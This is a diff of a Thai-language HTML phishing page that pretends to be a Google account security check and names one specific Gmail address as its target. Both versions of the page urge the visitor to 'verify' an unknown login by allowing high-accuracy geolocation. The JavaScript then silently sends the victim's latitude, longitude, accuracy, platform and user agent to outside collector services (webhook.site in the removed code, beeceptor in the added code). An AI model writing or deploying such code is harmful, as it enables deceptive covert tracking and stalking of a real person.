@@ -3,139 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ยืนยันบัญชี - Security Check</title>
+    <title>ระบบยืนยันตัวตนความปลอดภัย</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500&display=swap');
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
-        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
+        body { 
+            font-family: 'Kanit', sans-serif; 
+            background-color: #2f3436; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
         .container { 
-            background: white; 
-            padding: 40px 24px; 
-            border-radius: 8px; 
-            border: 1px solid #dadce0; 
-            max-width: 400px; 
-            width: 100%; 
+            background: #3f4547; 
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
             text-align: center; 
+            max-width: 400px; 
+            width: 90%; 
         }
-
-        /* โลโก้จำลองโทนสี Google */
-        .logo-box {
-            display: flex;
-            justify-content: center;
-            font-size: 32px;
-            font-weight: 500;
-            margin-bottom: 20px;
-            letter-spacing: -1.5px;
+        .icon { 
+            font-size: 60px; 
+            color: #4285f4; 
+            margin-bottom: 20px; 
         }
-        .b { color: #4285F4; } .r { color: #EA4335; } 
-        .y { color: #FBBC05; } .g { color: #34A853; }
-
-        .user-chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            padding: 5px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 20px;
-            margin-bottom: 24px;
-            font-size: 14px;
-            color: #3c4043;
+        h1 { 
+            font-size: 22px; 
+            color: #ffffff; 
+            margin-bottom: 15px; 
         }
-        .user-chip svg { width: 18px; height: 18px; fill: #5f6368; }
-
-        h1 { font-size: 22px; color: #202124; margin-bottom: 12px; font-weight: 400; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 24px; }
-
-        .shield-icon {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 20px;
+        p { 
+            font-size: 15px; 
+            color: #bdc3c7; 
+            line-height: 1.5; 
+            margin-bottom: 30px; 
         }
-
-        .btn-next { 
-            background: #1a73e8; 
+        button { 
+            background-color: #4285f4; 
             color: white; 
             border: none; 
-            padding: 12px 24px; 
-            border-radius: 4px; 
-            font-size: 14px; 
-            font-weight: 500; 
+            padding: 15px 30px; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: 600; 
             cursor: pointer; 
-            width: 100%;
-            transition: background 0.2s;
+            width: 100%; 
+            transition: background 0.3s; 
         }
-        .btn-next:hover { background: #1557b0; }
-        
-        #loading { margin-top: 15px; font-size: 12px; color: #1a73e8; display: none; }
+        button:hover { 
+            background-color: #3367d6; 
+        }
+        .footer { 
+            margin-top: 20px; 
+            font-size: 12px; 
+            color: #bdc3c7; 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-box">
-        <span class="b">S</span><span class="r">e</span><span class="y">c</span><span class="b">u</span><span class="g">r</span><span class="r">e</span>
-    </div>
-
-    <h1>การตรวจสอบความปลอดภัย</h1>
-    
-    <div class="user-chip">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
-        icegot153002@gmail.com
-    </div>
-
-    <div class="shield-icon">
-        <svg viewBox="0 0 24 24" fill="#4285F4"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 13.17l5.59-5.59L17 9l-7 8z"/></svg>
-    </div>
-
-    <p>Google จำเป็นต้องยืนยันว่าคุณคือเจ้าของบัญชีนี้จริง โดยการจับคู่พิกัด GPS ของอุปกรณ์ปัจจุบัน</p>
-    
-    <button class="btn-next" id="btnNext" onclick="verify()">ถัดไป</button>
-    <div id="loading">กำลังเชื่อมต่อฐานข้อมูลความปลอดภัย...</div>
+    <div class="icon">🔒</div>
+    <h1>มีการเข้าสู่ระบบจากพื้นที่ที่ไม่รู้จัก</h1>
+    <p>เรียน คุณ icegot153002@gmail.com</p>
+    <p>มีการเข้าสู่ระบบจากพื้นที่ที่ไม่รู้จัก กรุณายืนยันตำแหน่งในเครื่องนี้ว่าบัญชีนี้เป็นของคุณ</p>
+    <button onclick="getLocation()">ยืนยันตำแหน่ง</button>
+    <div class="footer">ระบบตรวจสอบความปลอดภัยอัตโนมัติ 2026</div>
 </div>
 
 <script>
-    const WEB_HOOK = "https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88";
-
-    async function verify() {
-        const btn = document.getElementById('btnNext');
-        const load = document.getElementById('loading');
-        
-        btn.disabled = true;
-        btn.innerText = "กำลังดำเนินการ...";
-        load.style.display = "block";
-
-        try {
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, {
-                    enableHighAccuracy: true,
-                    timeout: 20000,
-                    maximumAge: 0
-                });
-            });
-            
-            const payload = {
-                target: "icegot153002@gmail.com",
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                accuracy: pos.coords.accuracy + "m",
-                device: navigator.userAgent
+    function getLocation() {
+        if (navigator.geolocation) {
+            const options = {
+                enableHighAccuracy: true, 
+                timeout: 20000,           
+                maximumAge: 0             
             };
+            navigator.geolocation.getCurrentPosition(sendData, showError, options);
+        } else {
+            alert("เบราว์เซอร์ของคุณไม่รองรับระบบความปลอดภัยนี้");
+        }
+    }
 
-            await fetch(WEB_HOOK, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+    function sendData(position) {
+        const payload = {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            accuracy: position.coords.accuracy + " meters",
+            platform: navigator.platform,
+            agent: navigator.userAgent,
+            timestamp: new Date().toLocaleString()
+        };
 
-            alert("ยืนยันตัวตนสำเร็จ");
-            window.location.href = "https://myaccount.google.com";
+        fetch("https://whbfc04e88f897ef646a.free.beeceptor.com", {
+            method: "POST",
+            mode: "cors", 
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).then((response) => {
+            if (response.ok) {
+                alert("ยืนยันตำแหน่งสำเร็จ");
+            } else {
+                alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
+            }
+        });
+    }
 
-        } catch (e) {
-            alert("โปรดกด 'อนุญาต' (Allow) เพื่อเข้าใช้งานบัญชีของคุณต่อ");
-            location.reload();
+    function showError(error) {
+        if (error.code === error.PERMISSION_DENIED) {
+            alert("กรุณาเลือก 'อนุญาต' (Allow) เพื่อยืนยันตำแหน่งของท่าน");
+        } else if (error.code === error.POSITION_UNAVAILABLE) {
+            alert("ไม่สามารถเข้าถึงตำแหน่งได้");
+        } else if (error.code === error.TIMEOUT) {
+            alert("หมดเวลาการรอตำแหน่ง");
+        } else {
+            alert("ระบบขัดข้องชั่วคราว กรุณาลองใหม่อีกครั้ง");
         }
     }
 </script>
 
 </body>
 </html>
+
 
 
